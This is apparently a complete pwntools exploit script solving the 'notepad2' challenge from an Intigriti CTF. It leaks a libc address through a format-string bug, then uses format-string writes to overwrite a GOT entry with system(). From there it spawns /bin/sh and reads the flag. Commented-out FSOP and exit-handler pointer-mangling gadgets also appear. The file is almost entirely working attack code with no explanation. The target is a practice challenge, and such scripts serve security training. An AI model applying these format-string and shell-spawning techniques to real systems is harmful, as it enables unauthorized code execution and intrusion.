from pwn import *
import sys
import os
#Cre: vilex1337

_path = "./notepad2_patched"
exe = context.binary = ELF(_path, checksec=False)
libc = ELF("./libc.so.6", checksec=False)
#ld = ELF("./ld-linux-x86-64.so.2", checksec=False)
add = 'notepad2.ctf.intigriti.io'
port = 1342
cmd = f'''
    set solib-search-path {os.getcwd()}
    b viewNote
    continue
'''
_mode = 0
_arch = 64

def conn():
    global _mode
    if(len(sys.argv) == 1):
        _mode = 2
        return gdb.debug(_path, cmd)
    if(sys.argv[1] == 'exp'):
        _mode = 3
        return remote(add, port)
    _mode = 1
    return process(_path)

rol = lambda val, r_bits, max_bits: \
    (val << r_bits%max_bits) & (2**max_bits-1) | \
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))

ror = lambda val, r_bits, max_bits: \
    ((val & (2**max_bits-1)) >> r_bits%max_bits) | \
    (val << (max_bits-(r_bits%max_bits)) & (2**max_bits-1))

def encrypt(v, key):
    return p(rol(v ^ key, 0x11, 64))

#############  next | count  | type (cxa) | addr                             | arg               | not used
#onexit_fun =  p(0) + p(1)  +  p(4)       + encrypt(libc.sym['system'], key) + p(heap + 0x2c0)  +  p(0)
'''
_op_file = FileStructure()
_op_file.unknown2 = p(0)*2 + p(libc.sym["system"]) + p(0)*3 + p(libc.sym["_IO_wfile_jumps"] - 0x20 ) + p(libc.sym["_IO_2_1_stdout_"] +0x50)
_op_file._wide_data = libc.sym["_IO_2_1_stdout_"]
_op_file.flags = 0xfbad20b1 + (int.from_bytes(b';sh;', 'little') << 32)
_op_file._lock = libc.address + 0x21a200
_tmp_file = bytes(_op_file)
'''

def p(_data):
    if(_arch == 64):
        return p64(_data, endian = 'little')
    return p32(_data, endian = 'little')

chall = conn()

def _send(_rgx, _data):
    chall.sendafter(_rgx, _data)

def _sendline(_rgx, _data):
    chall.sendlineafter(_rgx, _data)

#rop = ROP(libc)
#rop.find_gadget(['pop rdi', 'ret'])[0]
#log.info

def check():
    chall.interactive()
    exit()

def create(idx, data):
    _sendline(b'> ', b'1')
    _sendline(b'> ', str(idx).encode())
    _sendline(b'> ', data)

def view(idx):
    _sendline(b'> ', b'2')
    _sendline(b'> ', str(idx).encode())

def remove(idx):
    _sendline(b'> ', b'3')
    _sendline(b'> ', str(idx).encode())

def main():
    payload = b'%13$p'
    create(0, payload)
    view(0)
    libc.address = int(chall.recvline()[:-1].decode(), 16) - 0x28150 
    log.info(f"Libc: {hex(libc.address)}")
    log.info(f"System: {hex(libc.sym['system'])}")
    payload = b'%' + str(0x404000).encode() + b'c%8$lln'
    payload1 = b'%' + str((libc.sym['system'] & 0xffff)).encode() + b'c%12$n'
    remove(0)
    create(1, payload)
    view(1)
    create(2, payload1)
    view(2)
    payload = b'%' + str(0x4002).encode() + b'c%8$hn'
    create(3, payload)
    view(3)
    payload1 = b'%' + str(((libc.sym['system'] >> 16) & 0xffff)).encode() + b'c%12$hn'
    print(payload1)
    create(4, payload1)
    view(4)
    create(5, b'/bin/sh')
    remove(5)
    chall.sendline(b'cat flag')
    check()

if __name__ == "__main__":
    main()
